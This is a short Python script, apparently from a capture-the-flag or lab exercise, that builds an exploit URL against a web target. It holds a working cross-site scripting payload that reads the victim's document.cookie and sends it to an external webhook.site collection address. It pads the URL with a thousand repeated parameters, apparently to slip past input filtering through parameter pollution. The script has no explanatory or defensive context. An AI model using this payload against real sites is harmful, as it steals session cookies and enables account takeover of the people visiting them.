target_url = "http://web/index.php"
webhook_url = "https://webhook.site/92ce6329-3b70-4ab8-a637-5f291eb38460"

xss_payload = f'<svg/onload="new Image().src=`{webhook_url}/?cookie=${{encodeURIComponent(document.cookie)}}`">'
pollution_suffix = "&P=" + "&P=".join([str(i) for i in range(1, 1001)])

full_exploit_url = f"{target_url}?msg={xss_payload}{pollution_suffix}"
print(full_exploit_url)